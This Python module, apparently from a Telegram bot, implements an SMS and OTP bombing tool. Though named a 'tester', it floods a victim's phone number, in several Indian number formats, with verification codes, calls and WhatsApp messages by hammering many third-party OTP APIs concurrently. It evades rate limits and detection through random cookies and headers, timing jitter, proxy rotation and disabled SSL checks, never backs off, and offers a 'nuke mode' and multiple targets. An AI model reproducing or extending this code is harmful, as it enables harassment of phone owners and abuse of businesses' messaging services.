from __future__ import annotations

import asyncio
import copy
import time
import random
import string
import uuid
from typing import Dict, List, Optional, Callable, Set

import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector

from helpers import replacePlaceholders, injectRotatedHeaders


# ---------------------------------------------------------------------------
# OTP detection
# ---------------------------------------------------------------------------

OTP_KEYWORDS = [
    "otp sent", "otp has been sent", "verification code sent",
    "sent successfully", "sms sent", "message sent",
    "\"success\":true", "\"status\":\"success\"", "\"status\":\"ok\"",
    "\"result\":true", "successfully sent", "send otp", "otp generated",
    "message delivered", "sms delivered", "code sent", "verification sent",
    "call initiated", "call placed", "calling", "voice call",
    "whatsapp", "wp otp", "sent to whatsapp",
]

def isConfirmedOtp(status: int, text: str) -> bool:
    if status not in (200, 201, 202):
        return False
    return any(k in text.lower() for k in OTP_KEYWORDS)

def is2xx(status: int) -> bool:
    return 200 <= status < 300


# ---------------------------------------------------------------------------
# Phone format variants — hit every possible format
# ---------------------------------------------------------------------------

def getPhoneVariants(phone: str) -> List[str]:
    return [
        phone,
        f"91{phone}",
        f"+91{phone}",
        f"0{phone}",
    ]


# ---------------------------------------------------------------------------
# Cookie rotation — fresh random cookies per request
# ---------------------------------------------------------------------------

def generateRandomCookies() -> dict:
    """Generate realistic-looking random session cookies."""
    return {
        "session_id":   "".join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "device_id":    str(uuid.uuid4()),
        "visitor_id":   str(uuid.uuid4()).replace("-", ""),
        "_ga":          f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
        "_gid":         f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
        "csrf_token":   "".join(random.choices(string.ascii_letters + string.digits, k=40)),
    }


def injectRotatedCookies(existing: Optional[dict]) -> dict:
    """Merge existing cookies with fresh random ones."""
    fresh = generateRandomCookies()
    if existing:
        fresh.update(existing)  # keep API-specific cookies, add randoms
    return fresh


# ---------------------------------------------------------------------------
# Per-API state
# ---------------------------------------------------------------------------

class ApiState:
    ACTIVE = "active"
    RATELIMITED = "ratelimited"
    DEAD = "dead"

    MIN_CONCURRENCY = 2
    MAX_CONCURRENCY = 64

    def __init__(self, name: str, baseConcurrency: int):
        self.name           = name
        self.status         = self.ACTIVE
        self.cooldownUntil  = 0.0
        self.errorStreak    = 0
        self.rlCount        = 0
        self.requests       = 0
        self.confirmed      = 0
        self.responses2xx   = 0
        self.rateLimits     = 0
        self.errors         = 0
        self.totalLatencyMs = 0.0
        self.latencyCount   = 0
        self.concurrency    = baseConcurrency
        self._successWindow = 0
        self._errorWindow   = 0
        self._windowSize    = 20

    def isAvailable(self) -> bool:
        return True  # Never stop — always fire

    def recordLatency(self, latencySeconds: float) -> None:
        self.totalLatencyMs += latencySeconds * 1000
        self.latencyCount   += 1

    def avgMs(self) -> int:
        if self.latencyCount == 0:
            return 0
        return int(self.totalLatencyMs / self.latencyCount)

    def adaptConcurrency(self, success: bool) -> None:
        if success:
            self._successWindow += 1
        else:
            self._errorWindow += 1
        total = self._successWindow + self._errorWindow
        if total < self._windowSize:
            return
        rate = self._successWindow / total
        if rate >= 0.7:
            self.concurrency = min(self.concurrency + 4, self.MAX_CONCURRENCY)
        elif rate <= 0.3:
            self.concurrency = max(self.concurrency - 1, self.MIN_CONCURRENCY)
        self._successWindow = 0
        self._errorWindow   = 0


# ---------------------------------------------------------------------------
# Stats — lock-free for speed
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self, apiNames: List[str], baseConcurrency: int) -> None:
        self.startTime  = time.time()
        self.totalReqs  = 0
        self.confirmed  = 0
        self.responses  = 0
        self.errors     = 0
        self.lastOtpApi = ""
        self.apiStates: Dict[str, ApiState] = {
            n: ApiState(n, baseConcurrency) for n in apiNames
        }
        self.onOtpConfirmed: Optional[Callable] = None

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.totalReqs / e, 1) if e > 0 else 0.0

    def recordSuccess(self, name: str, latency: float, confirmed: bool) -> None:
        self.totalReqs += 1
        self.responses += 1
        s = self.apiStates.get(name)
        if s:
            s.requests     += 1
            s.responses2xx += 1
            s.errorStreak   = 0
            s.recordLatency(latency)
            s.adaptConcurrency(True)
            if confirmed:
                s.confirmed    += 1
                self.confirmed += 1
                self.lastOtpApi = name

    def recordRateLimit(self, name: str) -> None:
        self.totalReqs += 1
        s = self.apiStates.get(name)
        if s:
            s.requests   += 1
            s.rateLimits += 1
            s.rlCount    += 1

    def recordError(self, name: str) -> None:
        self.totalReqs += 1
        self.errors    += 1
        s = self.apiStates.get(name)
        if s:
            s.requests    += 1
            s.errors      += 1
            s.errorStreak += 1
            s.adaptConcurrency(False)

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.apiStates.items():
            perApi[name] = {
                "requests":    s.requests,
                "confirmed":   s.confirmed,
                "responses":   s.responses2xx,
                "errors":      s.errors,
                "ratelimits":  s.rateLimits,
                "avgMs":       s.avgMs(),
                "status":      s.status,
                "concurrency": s.concurrency,
            }
        return {
            "totalReqs": self.totalReqs,
            "confirmed": self.confirmed,
            "responses": self.responses,
            "errors":    self.errors,
            "elapsed":   round(self.elapsed(), 1),
            "rps":       self.rps(),
            "perApi":    perApi,
            "total":     self.totalReqs,
            "otpSent":   self.confirmed,
        }


# ---------------------------------------------------------------------------
# Type coercion
# ---------------------------------------------------------------------------

def coerceTypes(obj, original):
    if isinstance(original, dict) and isinstance(obj, dict):
        return {k: coerceTypes(obj.get(k, v), v) for k, v in original.items()}
    if isinstance(original, list) and isinstance(obj, list):
        return [coerceTypes(o, p) for o, p in zip(obj, original)]
    if isinstance(original, int) and isinstance(obj, str):
        try: return int(obj)
        except (ValueError, TypeError): return obj
    if isinstance(original, float) and isinstance(obj, str):
        try: return float(obj)
        except (ValueError, TypeError): return obj
    return obj


# ---------------------------------------------------------------------------
# Shared keep-alive connector pool
# ---------------------------------------------------------------------------

_connectorPool: Dict[str, TCPConnector] = {}

def getConnector(proxy: Optional[str]) -> aiohttp.BaseConnector:
    if proxy:
        return ProxyConnector.from_url(proxy, limit=200, ssl=False, enable_cleanup_closed=True)
    key = "default"
    if key not in _connectorPool or _connectorPool[key].closed:
        _connectorPool[key] = TCPConnector(
            limit=0,
            limit_per_host=100,
            ttl_dns_cache=600,
            ssl=False,
            keepalive_timeout=60,
            force_close=False,
            enable_cleanup_closed=True,
        )
    return _connectorPool[key]


# ---------------------------------------------------------------------------
# Single API call — rotation + jitter + cookie rotation + retry
# ---------------------------------------------------------------------------

async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    retry: bool = True,
    phoneVariant: Optional[str] = None,
    jitter: bool = True,
) -> bool:
    name = api["name"]
    if stopEvent.is_set():
        return False

    # Random jitter 0-80ms to avoid pattern detection
    if jitter:
        await asyncio.sleep(random.uniform(0, 0.08))

    targetPhone = phoneVariant or phone

    try:
        cfg        = copy.deepcopy(api)
        rawHeaders = cfg.get("headers") or {}
        headers    = injectRotatedHeaders(replacePlaceholders(rawHeaders, targetPhone))
        params     = replacePlaceholders(cfg.get("params"), targetPhone)
        jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), targetPhone), api.get("json"))
        data       = replacePlaceholders(cfg.get("data"), targetPhone)
        # Rotate cookies — merge API cookies with fresh random ones
        rawCookies = replacePlaceholders(cfg.get("cookies"), targetPhone) or {}
        cookies    = injectRotatedCookies(rawCookies)
        url        = cfg["url"].replace("{phone}", targetPhone)

        t0 = time.time()
        async with session.request(
            cfg["method"], url,
            headers=headers, params=params,
            json=jsonData, data=data, cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=6, connect=2),
            allow_redirects=True,
            ssl=False,
        ) as resp:
            latency = time.time() - t0
            text    = await resp.text()

            if resp.status == 429:
                stats.recordRateLimit(name)
                return False

            if is2xx(resp.status):
                confirmed = isConfirmedOtp(resp.status, text)
                stats.recordSuccess(name, latency, confirmed)
                return True

            stats.recordError(name)
            if retry and not stopEvent.is_set():
                await callApi(session, api, phone, stats, stopEvent, retry=False,
                              phoneVariant=phoneVariant, jitter=False)
            return False

    except asyncio.TimeoutError:
        stats.recordError(name)
        return False
    except Exception:
        stats.recordError(name)
        return False


# ---------------------------------------------------------------------------
# Per-API worker — burst mode on launch + adaptive concurrency + flood
# ---------------------------------------------------------------------------

async def apiWorker(
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    proxy: Optional[str],
    baseConcurrency: int,
    burstDuration: float = 15.0,
    burstMultiplier: int = 5,
) -> None:
    """
    One dedicated worker per API.
    - BURST MODE: first burstDuration seconds fires burstMultiplier * concurrency requests
    - Then settles to adaptive concurrency
    - Flood mode: +3 extra on every success
    - Cycles all 4 phone variants
    - Random jitter + cookie rotation per request
    """
    connector    = getConnector(proxy)
    ownConnector = proxy is not None

    session = aiohttp.ClientSession(
        connector=connector,
        connector_owner=ownConnector,
    )

    try:
        activeTasks:  set  = set()
        phoneVariants      = getPhoneVariants(phone)
        variantIdx         = 0
        floodBudget        = 0
        startTime          = time.time()

        while not stopEvent.is_set():
            state = stats.apiStates.get(api["name"])

            # Clean finished tasks
            done        = {t for t in activeTasks if t.done()}
            activeTasks -= done

            # Flood: +3 on each success
            for t in done:
                try:
                    if t.result():
                        floodBudget += 3
                except Exception:
                    pass

            # Burst mode: first N seconds run at multiplied concurrency
            elapsed = time.time() - startTime
            if elapsed < burstDuration:
                targetConcurrency = (state.concurrency if state else baseConcurrency) * burstMultiplier
            else:
                targetConcurrency = state.concurrency if state else baseConcurrency

            # Cap to reasonable max
            targetConcurrency = min(targetConcurrency, ApiState.MAX_CONCURRENCY * 2)

            # Fire flood burst
            if floodBudget > 0 and len(activeTasks) < targetConcurrency + 20:
                variant = phoneVariants[variantIdx % len(phoneVariants)]
                variantIdx += 1
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, phoneVariant=variant)
                )
                activeTasks.add(task)
                floodBudget -= 1
                continue

            # Normal fill
            if len(activeTasks) < targetConcurrency:
                variant = phoneVariants[variantIdx % len(phoneVariants)]
                variantIdx += 1
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, phoneVariant=variant)
                )
                activeTasks.add(task)
            else:
                await asyncio.sleep(0)

        # Cleanup
        for t in activeTasks:
            t.cancel()
        if activeTasks:
            await asyncio.gather(*activeTasks, return_exceptions=True)

    finally:
        await session.close()


# ---------------------------------------------------------------------------
# Single API test (admin)
# ---------------------------------------------------------------------------

async def testSingleApi(api: dict, phone: str) -> dict:
    try:
        cfg        = copy.deepcopy(api)
        rawHeaders = cfg.get("headers") or {}
        headers    = injectRotatedHeaders(replacePlaceholders(rawHeaders, phone))
        params     = replacePlaceholders(cfg.get("params"), phone)
        jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data       = replacePlaceholders(cfg.get("data"), phone)
        cookies    = replacePlaceholders(cfg.get("cookies"), phone)
        url        = cfg["url"].replace("{phone}", phone)

        connector = TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as resp:
                latency = round((time.time() - t0) * 1000)
                text    = await resp.text()
                return {"ok": True, "status": resp.status, "latencyMs": latency, "snippet": text[:300].strip()}
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Timeout (>15s)"}
    except aiohttp.ClientConnectorError as e:
        return {"ok": False, "error": f"Connection failed: {str(e)[:60]}"}
    except Exception as e:
        return {"ok": False, "error": (str(e).strip() or type(e).__name__)[:80]}


# ---------------------------------------------------------------------------
# Proxy helpers
# ---------------------------------------------------------------------------

async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("http://httpbin.org/ip", timeout=aiohttp.ClientTimeout(total=5)):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


# ---------------------------------------------------------------------------
# Runner — single or multi-number
# ---------------------------------------------------------------------------

class TesterRunner:
    def __init__(
        self,
        phone: str,                          # primary phone (or comma-separated for multi)
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
        userId: Optional[int] = None,
        bot=None,
        nukeMode: bool = False,              # nuke = max workers, burst always on
    ) -> None:
        # Parse multi-number
        raw = [p.strip() for p in phone.replace("،", ",").split(",") if p.strip().isdigit()]
        self.phones    = raw if raw else [phone]
        self.phone     = self.phones[0]      # primary for display
        self.duration  = duration
        self.workers   = workers if not nukeMode else 64
        self.useProxy  = useProxy
        self._proxyList = proxyList or []
        self._userId   = userId
        self._bot      = bot
        self.nukeMode  = nukeMode

        from bot.services.api_manager import apiManager
        from bot.services.database import db
        self._apiConfigs = apiManager.getMergedConfigs()
        self._skipSet    = db.getSkippedApiNames()

        # One Stats object per phone target
        self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)
        self._stopEvent = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running   = False
        self._endTime   = 0.0

    @property
    def isRunning(self) -> bool:
        return self._running

    async def start(self) -> None:
        self._running  = True
        self._endTime  = time.time() + self.duration
        self._stopEvent.clear()
        self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]

        burstDuration   = 9999.0 if self.nukeMode else 15.0  # nuke = burst forever
        burstMultiplier = 10     if self.nukeMode else 5

        # Launch workers for EVERY phone target simultaneously
        for phone in self.phones:
            for idx, api in enumerate(activeApis):
                proxy = proxyList[idx % len(proxyList)] if proxyList else None
                task  = asyncio.create_task(
                    apiWorker(
                        api=api,
                        phone=phone,
                        stats=self.stats,
                        stopEvent=self._stopEvent,
                        proxy=proxy,
                        baseConcurrency=self.workers,
                        burstDuration=burstDuration,
                        burstMultiplier=burstMultiplier,
                    ),
                    name=f"api_{phone}_{api['name']}"
                )
                self._tasks.append(task)

        timer    = asyncio.create_task(self._timer(),    name="timer")
        watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
        self._tasks.extend([timer, watchdog])

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False

    async def _timer(self) -> None:
        delay = self._endTime - time.time()
        if delay > 0:
            await asyncio.sleep(delay)
        self._stopEvent.set()

    async def _watchdog(self) -> None:
        apiTasks = [t for t in self._tasks if t.get_name().startswith("api_")]
        if apiTasks:
            await asyncio.gather(*apiTasks, return_exceptions=True)
        self._running = False